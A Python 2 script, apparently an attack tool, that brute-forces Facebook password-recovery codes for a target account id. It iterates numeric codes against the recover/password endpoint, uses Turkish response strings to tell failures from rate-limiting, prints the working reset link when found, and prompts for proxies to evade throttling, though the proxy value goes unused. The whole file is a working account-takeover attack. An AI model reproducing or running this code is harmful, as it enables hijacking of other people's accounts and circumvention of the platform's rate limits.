import urllib
import sys

#######---------->> 100020559999798

try:
	id = sys.argv[1]
	print "[*] OK."
except:
	exit()

try:
	sayi = int(sys.argv[2])
	print "[+] Start integer:", sayi
except:
	sayi = 10100


face_link = "https://www.beta.facebook.com/recover/password?u="

while sayi < 999999:
	link = face_link + id + "&n=" + str(sayi)
	post = urllib.urlopen(link)
	try:
		assert "tfen tekrar dene." in post.read()
		print "[!] Sorry:", sayi
	except:
		try:
			assert "deniyorsun" in post.read()
			sayi -= 1
			break
		except:
			print "-" * 30
			print "[+] Found..!"
			print "Link:", link
			print "-" * 30
			exit()
	sayi += 1

while True:
	link = face_link + id + "&n=" + str(sayi)
	my = raw_input("Enter the proxy ex.1921.68.0.1:80 ::>")
	proxy = {'https': my}
	post = urllib.urlopen(link)
        try:
                assert "tfen tekrar dene." in post.read()
                print "[!] Sorry:", sayi
        except:
                try:
                        assert "deniyorsun" in post.read()
                        sayi -= 1
                        my = raw_input("Enter the proxy ex.1921.68.0.1:80 ::>")
			pass
                except:
                        print "-" * 30
                        print "[+] Found..!"
                        print "Link:", link
                        print "-" * 30
                        exit()
	sayi += 1

print "\n\n\n[+] Done."
